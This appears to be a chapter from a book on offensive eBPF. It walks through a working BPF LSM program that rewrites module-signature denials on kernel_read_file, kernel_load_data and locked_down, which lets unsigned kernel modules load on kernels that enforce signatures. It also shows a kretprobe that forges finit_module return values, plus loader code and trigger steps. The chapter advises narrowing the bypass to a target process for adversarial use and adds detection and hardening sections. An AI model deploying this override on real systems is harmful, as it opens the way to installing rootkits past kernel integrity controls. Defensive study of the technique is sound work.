---
layout: book
title: "Chapter 12: eBPF Signed-Driver Swap"
date: 2025-03-01
---

# Chapter 12: Flipping the Kernel's Module-Load Verdict

> **Note**: The real primitive in this chapter — a BPF LSM fmod_ret flip on `kernel_read_file` — does not fire on the linuxkit 6.12 aarch64 host we use for day-to-day development, because that kernel does not enforce module signatures. It fires on the Fedora 42 aarch64 QEMU VM run by `run-qemu-tests.sh`, which does enforce them. A secondary syscall-return illusion (registered as `ch12s`) fires on linuxkit and is kept because it is the only ch12-shape primitive that host can execute. The chapter is explicit about which does what.

## The Question and the Honest Answer

The question I started with was: can a BPF program flip a rejected kernel module load into a successful one — not just fool a userspace consumer into believing the module loaded, but actually land the module's bytes in kernel memory against an enforcing kernel?

The answer is yes, on a kernel that enforces module signatures, via BPF LSM fmod_ret. The real primitive for this chapter is `ch12-signed-driver-swap-lsm`: three fmod_ret programs on `lsm/kernel_read_file`, `lsm/kernel_load_data`, and `lsm/locked_down`. When signature enforcement is on — `CONFIG_MODULE_SIG_FORCE=y` in the kernel config, or `module.sig_enforce=1` on the kernel command line — and BPF LSM is active in the LSM stack, flipping the return of `kernel_read_file` from a denial to zero lets an unsigned blob through the integrity gate. The module's bytes get read in, and the loader continues down the path toward actually inserting the module into kernel memory.

That is the real override. It requires a specific configuration — signature enforcement on, BPF LSM active. Linuxkit has neither. Fedora, configured to run an enforcing kernel, has both. The chapter is about that primitive and is honest about where it fires.

There is a second, separate primitive kept in the repository as `ch12-signed-driver-swap-syscall`, registered in the harness as `ch12s`. It is not a real override. It is a kretprobe on `__arm64_sys_finit_module` that calls `bpf_override_return(ctx, 0)`, rewriting the syscall's userspace-visible return value regardless of what the kernel's loader actually did. Its marker says this plainly: `CH12_CONCEPT_PROVEN syscall_override_landed=yes module_actually_loaded=no`. It exists because it is the only ch12-shape primitive that fires on the linuxkit host, and because the illusion category is useful to keep alongside the real variant as a pedagogical contrast.

A third observer variant (`ch12-signed-driver-swap`) attaches kprobes to `load_module`, `module_sig_check`, and `mod_verify_sig` without mutating anything. Forensic visibility into the module-load decision path.

Three variants. One real override. One honest illusion. One observer. This chapter walks all three, starting with the real one.

## The Real Primitive: BPF LSM fmod_ret on the Module-Load Path

The kernel does not enforce module signatures in a single function. The decision is routed through the LSM (Linux Security Module) framework, which gives each registered LSM a chance to veto an operation. When `insmod` or `modprobe` calls `finit_module(2)` with an fd pointing at a `.ko` file, the kernel reads the file's contents through an integrity-gated path, and the LSM hooks in that path get the first crack at saying no.

Three hooks matter for the module-load path. Each one gates a different kind of kernel-internal load operation. The real variant attaches to all three and flips every denial it sees for targeted tgids to zero.

### `lsm/kernel_read_file`

`security_kernel_read_file(struct file *file, enum kernel_read_file_id id, bool contents)` is the LSM hook for file-backed reads that the kernel performs on userspace's behalf for integrity-sensitive purposes. The `id` argument tells the LSM what kind of read this is: `READING_MODULE`, `READING_FIRMWARE`, `READING_KEXEC_IMAGE`, `READING_POLICY`, `READING_X509_CERTIFICATE`, a handful of others. All of them share the property that what gets read is going to become part of the kernel's trusted state, so the read is a policy point.

For `finit_module`, the loader calls into this hook via `kernel_read_file_from_fd` while copying the module bytes in. A sig-enforcing kernel has IMA or a similar LSM registered that consults signature state at this point. If signature state is bad, the hook returns non-zero and the read aborts before the module bytes are even fully in kernel memory.

The BPF LSM program for this chapter attaches at `SEC("lsm/kernel_read_file")` and, for a targeted tgid, rewrites the hook's return from whatever-the-hook-said to zero. From the loader's perspective, the signature-check LSM said yes. The read proceeds.

### `lsm/kernel_load_data`

`security_kernel_load_data(enum kernel_load_data_id id, bool contents)` is the buffer-backed counterpart. The legacy `init_module(2)` syscall — still supported, used by some embedded systems — takes a raw userspace buffer rather than an fd. When the kernel copies that buffer in via `security_kernel_load_data`, this is the hook that gates it. The `id` distinguishes module, firmware, kexec-segment, and other buffer-backed load types.

We attach to this hook for the same reason: to catch module loads that take the `init_module` path rather than `finit_module`. Both routes converge at `load_module()` internally, but their LSM gates are distinct.

### `lsm/locked_down`

`security_locked_down(enum lockdown_reason what)` is the general lockdown gate. Modern kernels built with `CONFIG_SECURITY_LOCKDOWN_LSM=y` route many integrity-sensitive operations through a single LSM hook with a reason code. For module loads without a valid signature on an enforcing kernel, the reason is `LOCKDOWN_MODULE_SIGNATURE`. The hook's return dictates whether the operation is permitted.

On a non-locked-down kernel this hook returns zero and the primitive's flip is a no-op. On a kernel booted in lockdown mode (confidentiality or integrity), the hook can be the gate that rejects the module load even when signature checks by other means would have let it through. Flipping it to zero removes that veto.

### Why three hooks, not one

The module-load code path in modern kernels routes its integrity decisions through different LSM hooks depending on which syscall was used, whether the kernel was built with lockdown, and which LSMs are registered. `kernel_read_file` is the dominant hook for `finit_module` on a signed-module kernel; `kernel_load_data` is the dominant hook for `init_module`; `locked_down` is the dominant hook on lockdown-enabled kernels. Attaching all three covers the plausible configurations without making assumptions.

On the Fedora 42 test kernel the hook that actually fires on `insmod` is `kernel_read_file`. The other two attach without firing in this specific trigger. That is fine: they cost nothing extra at attach time and the program body returns zero if nothing needed to be flipped.

## Source Walk: The BPF LSM Object

The object at `ch12-signed-driver-swap-lsm.bpf.c` is short. Three programs, one ringbuf, one target map. I will walk it in order.

```c
char LICENSE[] SEC("license") = "GPL";

#define HOOK_KERNEL_READ_FILE 1
#define HOOK_KERNEL_LOAD_DATA 2
#define HOOK_LOCKED_DOWN      3
#define HOOK_NAME_LEN 24

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;
    int orig_ret;
    int flipped;
    char hook_name[HOOK_NAME_LEN];
};
```

GPL for BPF helper access (LSM programs require GPL). Three hook IDs, one per attached program, so userspace can tell which hook fired. The event carries pid and tgid, comm, the hook ID, the `orig_ret` (captured *before* any flip — the LSM's actual verdict), the `flipped` boolean, and a short human-readable hook name so the ringbuf consumer does not need an ID table to render log lines.

The `orig_ret` capture is the interesting field. It is the kernel's real decision. On a sig-enforcing kernel with an unsigned module, the LSM returns `-EBADMSG` or `-EKEYREJECTED` depending on which LSM is registered and which path the read took. Recording the pre-flip value lets the ringbuf consumer print something like `orig=-74 -> 0`, which makes the evidence unambiguous: here is what the kernel said, here is what we rewrote it to.

Maps:

```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");
```

A 256-KiB ringbuf for events and a TGID-keyed hash for targeting. The key 0 in `target_tgids` is reserved as a wildcard slot: if present, every caller's denial is flipped; if absent, only the explicitly listed TGIDs are flipped.

The `is_target_tgid` helper does two lookups: first the current TGID, then the wildcard slot. Either one hitting returns 1. This two-lookup design keeps per-TGID mode cheap (one map hit, one miss) and wildcard mode equally cheap (miss, then hit) on modern branch predictors.

Per-TGID mode is the one you use adversarially. Forging every caller's module-load denial would break systemd's module auto-loader at boot, break `modprobe` for legitimate drivers, and otherwise cause chaos. Wildcard mode is for testing the primitive end-to-end; real use should scope to the attacker's own process or a specific target.

The fmod_ret programs themselves are near-identical in shape. Here is the first:

```c
SEC("lsm/kernel_read_file")
int BPF_PROG(lsm_kernel_read_file,
             struct file *file,
             unsigned int id,
             bool contents,
             int ret)
{
    (void)file; (void)id; (void)contents;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid() && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit_named(HOOK_KERNEL_READ_FILE, NAME_KRF, ret, flipped);
    return new_ret;
}
```

The fmod_ret convention: the program's return value becomes the hook's effective return value, *if* the program is attached as `fmod_ret`. The BPF LSM infrastructure stitches fmod_ret programs into the LSM hook chain after the built-in LSMs have had their say. If any LSM in the chain returned non-zero, the final `ret` argument reflects that verdict; the fmod_ret program can override it by returning something else.

The condition is "target tgid AND ret was non-zero." The second clause matters: if the underlying LSM stack already said yes (returned 0), there is nothing to flip, and rewriting zero to zero would just muddy the ringbuf. We only flip denials. Emit the event last so the logged `flipped` flag reflects the final decision.

The `kernel_load_data` and `locked_down` programs are structural duplicates of this one, differing only in their hook ID, hook name, and the hook-specific argument signature that `BPF_PROG` unpacks.

## Source Walk: The Userspace Loader

The loader's job is to preflight BPF LSM availability, load and attach the three programs, install the target-TGID entries, and pump the ringbuf. The preflight is where correctness lives.

```c
static int check_lsm_bpf_enabled(char *reason, size_t rlen)
{
    FILE *f = fopen("/sys/kernel/security/lsm", "r");
    if (!f) {
        snprintf(reason, rlen, "/sys/kernel/security/lsm unreadable");
        return 0;
    }
    char buf[512] = {0};
    if (!fgets(buf, sizeof(buf), f)) { ... }
    if (!strstr(buf, "bpf")) {
        snprintf(reason, rlen,
                 "kernel lacks 'bpf' in /sys/kernel/security/lsm (boot with lsm=bpf,...)");
        return 0;
    }
    return 1;
}
```

`/sys/kernel/security/lsm` is a comma-separated list of active LSMs. If `bpf` is not in it, BPF LSM is inactive; fmod_ret programs will attach but never fire, because they are not in the LSM chain. That is a hard skip condition — no point starting the ringbuf consumer if no events can be produced.

On a kernel with BPF LSM active the loader proceeds to open-and-load the skeleton, attach all three programs, install the wildcard or per-TGID entries, and pump the ringbuf. The attach failures on individual programs are tolerated — if the running kernel does not expose one of the three hooks, the program for that hook will fail to attach but the other two can still run. In practice all three attach on modern kernels.

The ringbuf handler formats each event:

```c
printf("[ch12] FLIP\thook=%-.*s\tpid=%u\tcomm=%-16s\torig=%d\t-> 0\n",
       HOOK_NAME_LEN, e->hook_name[0] ? e->hook_name : "?",
       e->pid, e->comm, e->orig_ret);
```

One line per flipped event, carrying the hook name, the caller's pid and comm, and the `orig -> 0` rewrite. This is the evidence a defender would see in audit output if they happened to be reading the loader's stdout — which they wouldn't, in an adversarial deployment. It is here to make the proof-of-concept legible to a human reader.

## Target and Proof: the Fedora QEMU Run

The trigger at `trigger.sh` fabricates a minimal fake `.ko` — valid ELF64 relocatable header for aarch64, e_type=ET_REL, e_machine=EM_AARCH64 (0xB7), everything else zeroed, padded to 4 KiB — and attempts `insmod` on it. The ELF header is just enough to get past the loader's early magic-bytes check and into the module-loading path where the LSM hooks fire.

Three steps in the trigger. First, a baseline `insmod` with no BPF loader running — on an enforcing kernel with no valid signature on the blob, this produces an errno like `EBADMSG` ("Bad message") or `EKEYREJECTED` ("Key was rejected by service"). The trigger records this as `baseline_errno`.

Second, the loader starts with `-a` (wildcard). The trigger waits briefly, then `insmod`s the same fake blob again. If the LSM override fires on `kernel_read_file`, the signature gate is bypassed and the loader proceeds further down the module-load path — past the LSM's integrity veto, into ELF validation and beyond. The ELF validation of a zeros-filled blob still fails, but with a *different* errno: typically `ENOEXEC` ("Invalid module format"). The errno has shifted.

Third, the trigger compares. If the loader's ringbuf recorded at least one FLIP event *and* the observed errno changed from the baseline, the proof marker fires:

```
CH12_PROVEN flipped=N hook=kernel_read_file baseline=EBADMSG override=ENOEXEC
```

That is what the Fedora 42 aarch64 QEMU VM produces. On a kernel that does not enforce module signatures — linuxkit — the baseline `insmod` already fails with `ENOEXEC` (ELF validator rejects first, before any LSM even sees the load) and the LSM hooks never fire on the module-load path at all. In that case the loader emits `CH12_LSM_SKIP reason="kernel lacks 'bpf' in /sys/kernel/security/lsm"` (linuxkit does not boot with `lsm=bpf,...`) or, on a kernel with BPF LSM active but no sig enforcement, `CH12_SKIP reason="no kernel_read_file/load_data/locked_down flip observed (module-sig path not taken)"`.

The skip is honest. This is the primitive's required configuration: signature enforcement on, BPF LSM active, a module blob that reaches the signature-verification path. Any one of those absent and the primitive has nothing to flip.

`run-qemu-tests.sh` is the harness that sets this up. It mounts the PoCs into a Fedora 42 aarch64 QEMU VM (Fedora boots its modern kernel with BPF LSM active by default and has `module.sig_enforce` set on most images), runs `make`, and invokes `trigger.sh` with a 30-second timeout. Look for `CH12_PROVEN` in the output.

## Scope: What the Real Flip Does and Does Not Do

On the enforcing kernel with the flip active: the signature gate is bypassed. That is a real kernel-state-affecting primitive. It is not subject to the disclaimers the syscall illusion carries. Specifically:

- It *does* let the module bytes through the LSM integrity gate.
- It *does* advance the loader into ELF validation and beyond.
- If you supply a validly-formed unsigned `.ko` (a real module whose signature has been stripped or corrupted), it *does* cause that module to actually load into kernel memory, become visible in `lsmod`, register its sysfs entries under `/sys/module/<name>/`, and run its init function.

What it does not do:

- It does not suppress the kernel log message recording the original LSM decision. On `CONFIG_MODULE_SIG_FORCE=y` systems with audit configured, dmesg still contains the pre-flip verdict. The flip changes the in-kernel control flow; it does not rewrite the audit trail retroactively.
- It does not bypass kernel-level detectors that consult BPF program state — `bpftool prog list type lsm` shows the attached fmod_ret programs to anyone with `CAP_BPF`.
- It does not make the attack invisible. A defender with auditd, or who reads the LSM audit stream, sees the forged allow against the original deny and can reconstruct the bypass after the fact.

The trigger in this repo uses a zeros-padded fake `.ko`, not a validly-formed unsigned module, because the goal of the PoC is to prove the *flip* landed. Proving that the flip can carry a real malicious module into kernel memory requires a real malicious module, which the repo does not ship. The errno shift from `EBADMSG` to `ENOEXEC` is the proof that the LSM override changed the control flow; the subsequent ELF-validation rejection is the fake `.ko` meeting its own separate rejection for not being a real module. Two rejections, two different errnos, one real bypass sandwiched between them.

## Secondary: the Syscall-Return Illusion (`ch12-signed-driver-swap-syscall`, registered as `ch12s`)

The secondary variant at `ch12-signed-driver-swap-syscall` is not a real override. It is kept in the repository as a separate category because it is the only ch12-shape primitive that fires on the linuxkit development kernel.

The primitive: kretprobes on `__arm64_sys_finit_module` and `__arm64_sys_init_module`, both of which are listed in `/sys/kernel/debug/error_injection/list` on linuxkit 6.12 aarch64. `bpf_override_return(ctx, 0)` on these probes rewrites the syscall's userspace-visible return value, regardless of what the kernel's module loader actually did internally.

The loader's module bytes are still rejected. `lsmod` still shows nothing. `/proc/modules` is unchanged. `dmesg` still contains the original loader rejection message. Only the integer that `insmod`'s `syscall()` wrapper returns to userspace is flipped.

The proof marker is explicit about this:

```
CH12_CONCEPT_PROVEN syscall_override_landed=yes module_actually_loaded=no
```

`module_actually_loaded=no` is not a disclaimer tacked on for honesty's sake; it is a condition of the proof. The trigger asserts three things: `BEFORE_RC != 0` (baseline: kernel rejects bad .ko), `AFTER_RC == 0` (syscall return forged), and `lsmod_shows_module == no` (kernel state unchanged). All three together prove exactly what the primitive claims: the syscall-return illusion is in effect, and it is strictly an illusion.

The illusion still has utility. It fools orchestrators, shell scripts, and CI systems whose check of module-load success is `insmod && echo ok` — the class of consumers that trusts the syscall return as authoritative. It does not fool anything that post-checks `/proc/modules` or `/sys/module/<name>/`, which is a two-line fix for any defender who cares.

The reason to keep `ch12s` registered alongside the real LSM variant is pedagogical. It demonstrates the error-injection-allowlist pattern that ch14 (SCHED_FIFO impersonator) and ch18 (token bypass) also use — find a syscall in the allowlist, attach a kretprobe, rewrite the return. On linuxkit, where the sig-enforcement path is absent, the syscall-return illusion is the only ch12-shape primitive that can be proved at all. The repository is explicit that it is an illusion, not an analog of the LSM variant.

The harness registers it as:

```python
Poc("ch12s", "Signed-Driver Swap — syscall kretprobe (illusion)",
    "ch12-signed-driver-swap-syscall",
    hooks=["__arm64_sys_finit_module", "__arm64_sys_init_module"],
    prefix="[ch12s]", mode="trigger-runs-loader", timeout=25,
    proof_marker=r"CH12_CONCEPT_PROVEN|CH12_PROVEN|FORGE\s+pid=|_PROVEN",
    category="illusion"),
```

`category="illusion"` is load-bearing. `ch12s` is not a substitute for `ch12` and is not a fallback for it; it is a different primitive with a different, strictly narrower scope.

## Secondary: the Kprobe Observer (`ch12-signed-driver-swap`)

The third variant is `ch12-signed-driver-swap` — pure observer. Kprobes on `load_module`, `module_sig_check`, and `mod_verify_sig`, plus a kretprobe on `mod_verify_sig` to capture its return. No mutation, no overrides, no flips. Events to a ringbuf describing which module-load gates fired, in what order, with what return values.

This is a forensic tool, not an attack primitive. The value is visibility: on a system where module loads are happening, the observer variant lets you watch the kernel's decision-making in real time. If you are writing a detector for the LSM bypass, the observer variant is the telemetry source you would start from — it shows the pre-flip view of the module-load path, which is what a defender's in-kernel instrumentation would see.

The observer skips gracefully on kernels where the target symbols are absent (`CONFIG_MODULE_SIG=n` kernels do not have `mod_verify_sig`, for example). It does not require `bpf_override_return` privileges and does not trip the error-injection allowlist check.

## Cross-Kernel Behavior Matrix

| Kernel config                               | `ch12` (LSM)  | `ch12s` (syscall illusion)    | `ch12-observer` (kprobes)     |
|---------------------------------------------|---------------|-------------------------------|-------------------------------|
| linuxkit 6.12 aarch64 (no SIG_FORCE, no BPF LSM in `lsm=`) | SKIP | **PROVES** (syscall allowlist ok) | SKIP (sig symbols absent)     |
| Fedora 42 aarch64 QEMU (SIG_FORCE, BPF LSM active)         | **PROVES**    | would prove the illusion       | would fire on real loads      |
| stock Debian cloud image (SIG=y, SIG_FORCE=n, BPF LSM active) | flips but errno unchanged (no denial to flip) | proves illusion | fires on real loads |

The LSM variant requires enforcement *and* BPF LSM *and* an insmod that reaches the signature-verification path. All three. That configuration exists on hardened production kernels and on deliberate QEMU test setups. It does not exist on most development hosts.

The syscall illusion requires only that the module-load syscalls be in the error-injection allowlist, which they are on any kernel built with `CONFIG_FUNCTION_ERROR_INJECTION=y`. That is a much more permissive condition. The trade-off is that the illusion does not actually load anything.

## Detection

For the real LSM variant:

- `bpftool prog list type lsm` shows attached sleepable programs on `kernel_read_file`, `kernel_load_data`, `locked_down`. Legitimate userspace does not typically attach LSM fmod_ret on module-load hooks; one showing up is high-signal.
- The LSM audit stream (`auditctl -w /sys/fs/bpf -p wa` and LSM hook audit records) captures the attach event and, on some configurations, the hook-return mismatch between what the underlying LSM decided and what the chain returned.
- `dmesg` on an enforcing kernel still records the pre-flip integrity decision. A forensic examiner reading dmesg sees `modsign: module "fake" signature verification failed` (or equivalent) regardless of whether the LSM chain was subsequently overridden to allow the load. The log line is written before the override runs.

For the syscall illusion (`ch12s`):

- `lsmod` / `/proc/modules` / `/sys/module/<name>/` show no module. The canonical cross-check; defeats the illusion in two lines of shell.
- `dmesg` shows the original loader rejection.
- `auditctl -a always,exit -S finit_module -S init_module` records the pre-flip return value on the 6.12 kernels I tested; the kretprobe override runs after the audit-exit hook.
- `bpftool prog show type kprobe | grep finit_module` reveals the attached kretprobe.

For the observer: nothing to detect, it is just watching.

## Deployment Notes for the Defender

If you operate kernels that load modules and you care about this attack surface:

First, enable signature enforcement. `CONFIG_MODULE_SIG_FORCE=y` at kernel-build time, or `module.sig_enforce=1` on the kernel command line. Without enforcement, the LSM hooks in the module-load path return success regardless of signature state, and neither this primitive nor any other can bypass what was never enforced in the first place.

Second, audit your LSM stack. A kernel running `lsm=lockdown,yama,bpf` has BPF LSM active and is subject to fmod_ret overrides from any process with `CAP_BPF`. A kernel running `lsm=lockdown,yama` without BPF is not — but may lack other BPF features you rely on. The trade-off is real; the point is to know which stack you are running.

Third, do not trust `insmod`'s exit code alone. This defeats both the real LSM bypass (which leaves a real module loaded, so a post-check would see that it succeeded) *and* the syscall illusion (which leaves nothing loaded, so a post-check would catch the lie). The two-line cross-check — `insmod x.ko && lsmod | grep -q '^x\b'` — is universal and cheap.

Fourth, watch `bpftool prog list type lsm` for attachments on module-load hooks. Legitimate observability tools do not fmod_ret on `kernel_read_file`; they fentry/fexit for observation. An fmod_ret attach on that hook from an unexpected loader is high-signal.

## Why Linuxkit Skips, and Why That Matters

The linuxkit kernel on macOS Docker Desktop (Linux 6.12 aarch64 on an Apple Silicon host) is the default development surface for this book. It is fast, it is reproducible, and it runs most BPF primitives fine. But it does not enforce module signatures, and it does not boot with `lsm=bpf,...`. Two configuration decisions, both reasonable for a developer-facing virtual kernel, that together mean the real ch12 primitive has nothing to bite.

The honest response is to skip, not to claim a working attack on conditions the host cannot provide. The LSM trigger emits `CH12_LSM_SKIP` or `CH12_SKIP` with a reason string; the harness respects it; the chapter is explicit about it. The syscall illusion takes over as the ch12-shape primitive linuxkit can actually execute, and it is labeled what it is: an illusion, not a real override.

This pattern — real primitive requires specific kernel config, development host does not provide that config, secondary variant fills the gap — recurs across the book. Chapters 8, 11, and 15 have similar stories. Each chapter is explicit about which variant fires where and what each one proves. The field-manual voice: here is what worked, here are the conditions, here is what did not work and why.

## Why This Chapter is in the Book

The LSM bypass of module-signature enforcement is one of the most consequential BPF primitives against a hardened kernel. It turns a correctly-configured signing wall into a single `CAP_BPF`-gated decision. On a multi-tenant host, on a container that shares the host kernel, on any system where the threat model is "attacker may acquire `CAP_BPF` but not kernel-code-execution" — this primitive is the escalation path from "can load BPF programs" to "can load arbitrary kernel modules."

The syscall illusion is a narrower primitive, but a real one within its scope. Orchestration code that treats module-load syscall returns as authoritative is common; the illusion defeats all of it. Against a defender who has not thought to cross-check kernel state, the illusion is a complete bypass of the orchestration's assumption.

The observer is the forensic tool that makes both of the above legible. If you want to understand what the kernel's module-load path is actually doing on your specific host, the observer variant shows you.

Three variants, three categories, three different answers to the same question. The chapter title — "eBPF Signed-Driver Swap" — is literally true of only one of them. The other two are honest about what they are. That is the shape of the field.
